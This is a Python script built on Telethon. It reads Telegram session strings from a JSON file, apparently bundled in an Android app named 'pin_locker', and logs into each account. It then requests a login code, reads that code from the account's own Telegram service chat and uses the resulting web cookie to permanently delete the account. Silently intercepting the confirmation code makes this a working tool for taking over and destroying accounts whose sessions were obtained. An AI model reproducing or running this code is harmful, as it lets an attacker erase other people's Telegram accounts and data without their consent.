# Import Module Section.
from telethon.sync import TelegramClient
import time, os, pytz, json, requests
import pandas as pd
from telethon.sessions import StringSession


# Funtion Defination Section.

# login to telegram session.
def is_logged_in(id, hash, session_string):
    try:
        print(f"{id}, {hash}")
        client = TelegramClient(StringSession(session_string), id, hash)
        client.connect()
        if not client.is_user_authorized():
            print("String Session is not Authorized.")
            raise
        print('Logged in successfully.')
        return client
    except:
        print(f"Error occured while login to {id}. Please check out String Session.")
        return None

def send_code(num):
    link = "https://my.telegram.org/auth/send_password"
    body = f"phone={num}"
    rsp = requests.post(link, body).json()
    return rsp["random_hash"]

def get_cookie(num, hash, pwd):
    link = "https://my.telegram.org/auth/login"
    body = f"phone={num}&random_hash={hash}&password={pwd}"
    resp = requests.post(link, body)
    return resp.headers["Set-Cookie"]

def delete_account(cookie, _hash, num):
    link = "https://my.telegram.org/delete/do_delete"
    body = f"hash={_hash}"
    header = {
        "Cookie": cookie
    }
    resp = requests.post(link, body, headers=header).text
    if resp == "true":
        print(f"{num} Account Deleted.")

def get_hash(cookie):
    link = "https://my.telegram.org/delete"
    header = {
        "Cookie":cookie
    }
    data = requests.get(link, headers=header).text
    #print(data)
    _hash = data.split("hash: '")[1].split("',")[0]
    return _hash



def main():
    # Get login credentials from csv.
    try:
        login_data = pd.read_json("/data/user/0/com.subcode.pin_locker/files/chaquopy/AssetFinder/app/StringSession.json")
    except:
        print("Error in StringSession.json file. Check it out.")

    # Logging to session
    for i in range(len(login_data)):
        client = is_logged_in(login_data['api_id'][i], login_data['api_hash'][i], login_data['session_string'][i])
        number = client.get_me().phone

        code = send_code(number)
        dialogs = client.get_dialogs()
        first = dialogs[0]
        if first.name=='Telegram':
            msg = first.message.message
            pwd = msg.split("Anmeldecode:\n")[1].split('\n')[0]
            #print(pwd)
        else:
            print("Code not found.")
            exit()
        #pwd = input("enter code : ")
        cookie = get_cookie(number, code, pwd)
        #print(cookie)
        _hash = get_hash(cookie)
        #print(_hash)
        delete_account(cookie, _hash, number)

